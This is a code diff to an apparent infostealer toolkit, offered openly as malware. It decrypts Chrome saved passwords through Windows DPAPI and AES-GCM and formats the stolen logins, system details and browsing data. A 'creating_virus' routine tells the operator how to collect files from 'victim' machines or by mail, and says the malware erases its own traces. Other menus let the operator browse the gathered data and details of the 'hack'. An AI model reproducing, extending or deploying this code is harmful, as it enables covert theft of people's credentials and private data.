@@ -42,18 +42,20 @@ def chrome_data_and_time(chrome_date):
     try:return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)
     except Exception:return None
 def password_decryption(password: bytes, key):
-    encryption_key =base64.b64decode(key)[5:]
-    encryption_key=win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]#encryption key
     try:
-        iv = password[3:15]
-        password = password[15:]
-        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(password)
-        decrypted_pass = decrypted_pass[:-16].decode()
-        return decrypted_pass
-    except Exception:
-        try:return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-        except Exception:return "No Passwords"
+        encryption_key =base64.b64decode(key)[5:]
+        encryption_key=win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]#encryption key
+        try:
+            iv = password[3:15]
+            password = password[15:]
+            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(password)
+            decrypted_pass = decrypted_pass[:-16].decode()
+            return decrypted_pass
+        except Exception:
+            try:return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+            except Exception:return "No Passwords"
+    except Exception:return 'Error'
 def system_info_basic_configuration(row_data):
     modified_data=''
     list1=['system','architecture','mashine','network_name','platform','prosessor','python_comp','python_version','revision_py','addisional_info','host_name','ip_address','network_interface','profile','password']
@@ -80,16 +82,18 @@ def chrome_id_and_password_configuraation(row_data):
     modified_data=''
     list1=['main_url','login_page_url','user_name','password','creation_date','last_used_date']
     if row_data[0]=='default01':
+        row_data_part=row_data[3]
+        encryption_key=row_data_part[1]
+        print(encryption_key)
         for round,value in enumerate(row_data[1],start=0):
-            modified_data+='\n\n\n_'*42+'data'+str(round)+'_'*42+'\n\n'
-            for data in value:
-                modified_data+="\n"+"="*90+"\n"
-                modified_data+="\n{:<{}}|{:>{}}".format(list1[0],45,str(data[0]),45)
-                modified_data+="\n{:<{}}|{:>{}}".format(list1[1],45,str(data[1]),45)
-                modified_data+="\n{:<{}}|{:>{}}".format(list1[2],45,str(data[2]),45)
-                modified_data+="\n{:<{}}|{:>{}}".format(list1[3],45,str(password_decryption(data[3],encryption_key)),45)
-                modified_data+="\n{:<{}}|{:>{}}".format(list1[4],45,str(chrome_data_and_time(data[4])),45)
-                modified_data+="\n{:<{}}|{:>{}}".format(list1[5],45,str(chrome_data_and_time(data[5])),45)
+            modified_data+='\n\n\n'+'_'*42+'data'+str(round)+'_'*42+'\n\n'
+            modified_data+="\n"+"="*90+"\n"
+            modified_data+="\n{:<{}}|{:>{}}".format(list1[0],45,str(value[0]),45)
+            modified_data+="\n{:<{}}|{:>{}}".format(list1[1],45,str(value[1]),45)
+            modified_data+="\n{:<{}}|{:>{}}".format(list1[2],45,str(value[2]),45)
+            modified_data+="\n{:<{}}|{:>{}}".format(list1[3],45,str(password_decryption(value[3],encryption_key)),45)
+            modified_data+="\n{:<{}}|{:>{}}".format(list1[4],45,str(chrome_data_and_time(value[4])),45)
+            modified_data+="\n{:<{}}|{:>{}}".format(list1[5],45,str(chrome_data_and_time(value[5])),45)
     elif row_data[0] in ('error202:)','error404:)'):modified_data+='\n\n\n_'*43+'data'+"data"+'_'*43+'\n\n'+str(row_data[1][0][0]).center(90,'_')
     else:modified_data+='there-is-some-error-or-data-is-not-readable'.center(90,'-')
     row_data_part=row_data[3]
@@ -186,16 +190,23 @@ def show_json_info(path):
     def data_get1(name):
         try:
             info=data["we_got_in_return"][name]
-        except Exception: info=None
+        except KeyError: info=data["data_able_to_collect"][name]
+        except Exception:info=None
         return str(info)
+    try:name_of_v=data['name_of_virus']
+    except Exception:name_of_v=data["name_of_attack"]
     print(colored('-'*40+'info of attack'+'-'*40,'yellow'))
-    print(colored('Name of Virus :- ','blue')+colored(data['name_of_virus'],'white',attrs=['bold']))
+    print(colored('Name of Virus :- ','blue')+colored(name_of_v,'white',attrs=['bold']))
     print(colored('Encryption Key :- ','blue')+colored(data['encryption_key'],'cyan')+'\n')
     print(colored('Information Given:------------','blue'))
-    print(colored('   - Created Date: ','blue')+colored(data['created_date']))
-    print(colored('   - Last Time Opened: ','blue')+colored(data['last_time_open']))
-    print(colored('   - Received Status: ','blue')+colored(data['ressived_status']))
-    print(colored('   - Data Received Time: ','blue')+colored(data['data_resived_time']))
+    try:print(colored('   - Created Date: ','blue')+colored(data['created_date']))
+    except Exception:pass
+    try:print(colored('   - Last Time Opened: ','blue')+colored(data['last_time_open']))
+    except Exception:pass
+    try:print(colored('   - Received Status: ','blue')+colored(data['ressived_status']))
+    except Exception:pass
+    try:print(colored('   - Data Received Time: ','blue')+colored(data['data_resived_time']))
+    except Exception:print(colored('   - Data Received Time: ','blue')+colored(data['status']))
     print(colored('='*65,'black')+'\n'+'|{:^{}}|{:^{}}|{:^{}}|'.format(colored('Value','light_yellow'),29,colored('Expected return','yellow'),30,colored('We got in return','yellow'),30)+'\n'+colored('-'*66,'black'))
     print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('system_info','light_yellow'),29,colored(data_get("system_info"),'blue'),30,colored(data_get1("system_info"),'blue'),30)+'\n'+colored('-'*66,'black'))
     print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('chrome_basic_data','light_yellow'),29,colored(data_get("chrome_basic_data"),'blue'),30,colored(data_get1("chrome_basic_data"),'blue'),30)+'\n'+colored('-'*66,'black'))
@@ -455,7 +466,7 @@ def creating_virus(type_of_virus:bool,path_of_rowvirus:str,target_path:str,name_
         print(colored('virus will send the all file in the given mail address just','blue'),colored('collect it before 24hours from ur computer','red'))
     else:
         print(colored('wait few minutes and after that copy the filles from victim devies by given path or default path("C:\\Users\\Public") and put it in your devies and you done... ','blue'))
-        print(colored('and after 2 min code will remove its self all the trase and after that','blue'),colored('run data_stabalizer.py in your computer for setup data in directory','yellow'))
+        print(colored('and after 2 min code will remove its self all the trase and after that','blue'),colored('run main.py in your computer and go to [3]collecting data and show the directory where u put app data','yellow'))
     nothing=input(colored('tap anything to continue','light_yellow'))
 def about_me():
     while True:
@@ -498,6 +509,7 @@ def collecting_data(info_resorse):
         data["data_resived_time"]=staus
         data["last_time_open"]=str(datetime.now())
         print(colored('status data has been updated....','blue'))
+        with open(info_resorse+'\\'+name_of_attack+'dir'+'\\database\\info.json','w',encoding='Utf-8') as info_json:data=json.dump(data,info_json)
         for file in file_list:
             if os.path.exists(path_input+'\\'+file+'new'):
                 try:
@@ -667,6 +679,7 @@ def viwing_data(info_resorse):
                 elif os.path.exists(path_input):pass
                 else:nothing=input(colored(' '*20+'something went wrong','red'));continue
                 while True:
+                    skull_img(True)
                     print(colored(' '*20+'what u wanna see here?','yellow'))
                     print(colored(' '*23+'[1] data gatered ','blue'))
                     print(colored(' '*23+'[2] info about the hack','blue'))
@@ -680,7 +693,7 @@ def viwing_data(info_resorse):
                                 if not list_dir[response_inside] in ['system_info','chrome_data','chrome_id_pass','chrome_web_data','chr_history_data','system_edge']:print(colored('data not acknowleged may couse error while data extracting','red'))
                                 try:
                                     print(colored('opening document '+list_dir[response_inside],'yellow'))
-                                    with open(path_input+list_dir[response_inside],'r',encoding='Utf-8')as file:
+                                    with open(path_input+'\\'+list_dir[response_inside],'r',encoding='Utf-8')as file:
                                         display_text(opening_data(list_dir[response_inside],eval(file.read())))     
                                 except Exception as e:nothing=input(colored('an error arcued while opening the document '+str(e),'red'))
                             else:break
